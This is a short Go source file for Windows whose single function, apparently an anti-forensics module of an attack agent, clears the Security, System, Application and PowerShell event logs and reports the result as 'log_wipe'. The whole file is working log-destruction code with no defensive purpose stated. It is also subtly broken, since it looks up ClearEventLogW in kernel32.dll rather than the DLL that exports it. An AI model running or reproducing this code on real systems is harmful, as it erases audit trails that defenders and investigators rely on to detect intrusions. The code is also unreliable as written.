//go:build windows
// +build windows

package main

import (
	"fmt"
	"syscall"
	"unsafe"
)

// wipeEventLog clears Security, System, and Application event logs, plus PowerShell operational.
func wipeEventLog() string {
	k32 := syscall.NewLazyDLL("kernel32.dll")
	clearEventLog := k32.NewProc("ClearEventLogW")

	advapi32 := syscall.NewLazyDLL("advapi32.dll")
	openEventLog := advapi32.NewProc("OpenEventLogW")
	closeEventLog := advapi32.NewProc("CloseEventLog")

	logs := []string{"Security", "System", "Application", "Windows PowerShell", "Microsoft-Windows-PowerShell/Operational"}
	var results []string

	for _, name := range logs {
		namePtr, _ := syscall.UTF16PtrFromString(name)
		hLog, _, _ := openEventLog.Call(0, uintptr(unsafe.Pointer(namePtr)))
		if hLog == 0 {
			results = append(results, fmt.Sprintf("open %s failed", name))
			continue
		}
		ret, _, _ := clearEventLog.Call(hLog, 0)
		closeEventLog.Call(hLog)
		if ret != 0 {
			results = append(results, fmt.Sprintf("cleared %s", name))
		} else {
			results = append(results, fmt.Sprintf("clear %s failed", name))
		}
	}
	return fmt.Sprintf("log_wipe: %v", results)
}
